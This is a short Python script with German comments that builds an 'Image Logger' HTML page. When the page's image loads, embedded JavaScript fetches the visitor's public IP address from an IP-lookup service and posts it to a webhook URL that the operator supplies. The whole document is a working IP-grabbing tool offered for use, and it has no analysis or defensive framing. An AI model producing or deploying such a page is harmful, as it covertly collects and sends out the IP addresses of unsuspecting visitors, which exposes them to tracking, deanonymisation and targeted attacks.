import requests

def main():
    # Benutzer nach Webhook fragen
    webhook_url = input("Enter webhook URL: ")

    # HTML-Seite mit eingebettetem IP-Logger-Skript erstellen
    html_content = f'''
    <html>
    <head>
        <title>Image Logger</title>
    </head>
    <body>
        <img src="https://via.placeholder.com/150" alt="Placeholder Image" onload="fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => {{
            fetch('{webhook_url}', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json'
                }},
                body: JSON.stringify({{'content': 'IP Address: ' + data.ip}})
            }});
        }});" />
    </body>
    </html>
    '''

    # HTML-Seite speichern
    with open("image_logger.html", "w") as file:
        file.write(html_content)
    print("HTML file created successfully.")

if __name__ == "__main__":
    main()
